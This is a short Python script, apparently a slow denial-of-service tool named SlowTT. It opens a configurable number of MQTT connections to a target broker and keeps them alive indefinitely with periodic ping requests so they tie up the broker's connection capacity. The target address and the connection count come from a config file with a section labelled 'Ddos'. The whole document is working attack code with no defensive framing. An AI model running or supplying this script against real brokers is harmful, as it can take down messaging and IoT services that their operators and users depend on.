import paho.mqtt.client as mqtt
import time
from configparser import ConfigParser


class SlowTT:
    def __init__(self, ip_address: str, port: int, keepalive: int, connections: int):
        self.ip_address = ip_address
        self.port = port
        self.keepalive = keepalive
        self.connections = connections

    def attack(self):
        clients = []
        start_time = time.time()
        for i in range(self.connections):
            client_name = "Client_No.{}".format(i + 1)
            current_client = mqtt.Client(client_name, protocol=5)
            current_client.connect(self.ip_address, self.port, self.keepalive)
            clients.append(current_client)
        cost_time = time.time() - start_time
        while True:
            for client in clients:
                client._send_pingreq()
            time.sleep(self.keepalive - cost_time)


if __name__ == '__main__':
    config = ConfigParser()
    config.read("net.config")
    ip_address = config.get('Host', 'ip_address')
    port = config.getint('Host', 'port')
    keepalive = config.getint('Host', 'keepalive')
    connections = config.getint('Ddos', 'connections')
    slowtt = SlowTT(ip_address, port, keepalive, connections)
    slowtt.attack()
